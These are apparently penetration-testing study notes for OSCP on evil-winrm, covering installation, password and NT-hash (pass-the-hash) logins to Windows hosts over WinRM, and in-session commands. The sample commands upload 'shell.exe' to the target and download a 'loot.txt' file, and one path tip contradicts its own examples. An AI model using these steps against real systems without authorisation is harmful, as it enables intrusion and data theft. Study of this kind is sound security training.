---
title: "evil-winrm"
slug: evil-winrm
category: notes
handbook: oscp
tags: ["windows"]
draft: false
pubDatetime: 2026-09-13T19:42:38+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "Interactive PowerShell over WinRM, run from Kali."
---
Interactive PowerShell over WinRM, run from Kali. The preferred shell when WinRM (5985, or 5986 over SSL) is reachable with known credentials: it is stable, takes file transfer and PowerShell commands in the same session, and needs no listener. Which accounts can log on and the username format that picks local vs domain accounts is in [Windows Remote Access](/collections/oscp/windows-remote-access). Pass-the-hash and credential reuse forms are in [AD Lateral Movement](/collections/oscp/ad-lateral-movement).

## Install

```bash
sudo apt install evil-winrm
```

## Connect

```bash
evil-winrm -i TARGET -u user -p 'password'
evil-winrm -u 'DOMAIN\user' -p 'password' -i TARGET
evil-winrm -u user -H <NThash> -i TARGET
```

- `-i` / `--ip` is the target address.
- `-H` takes the NT hash instead of `-p`, authenticating by hash directly.
- `-P` overrides the port when WinRM sits anywhere other than 5985.
- `-S` connects over the SSL endpoint on 5986.

## In-Session Commands

Shell built-ins (not PowerShell commands), for transfer and utility:

```powershell
download C:\Windows\Temp\loot.txt
upload /home/kali/shell.exe C:\Windows\Temp\shell.exe
menu
```

- Remote path first on `download`, local first on `upload`.
- Use forward slashes in remote paths; the command parser consumes backslashes.
- Running the same session avoids a second listener: transfer through the shell you already have.

Two PowerShell details that bite here and are documented with the context they appear in: `>` is PowerShell redirection inside this session and breaks `cmd /c` workarounds ([Database Enumeration](/collections/oscp/database-enumeration)), and a WinRM logon is a network logon, so a privilege present in `whoami /priv` may still be unusable from this shell ([Windows Token Privileges](/collections/oscp/windows-token-privileges)).
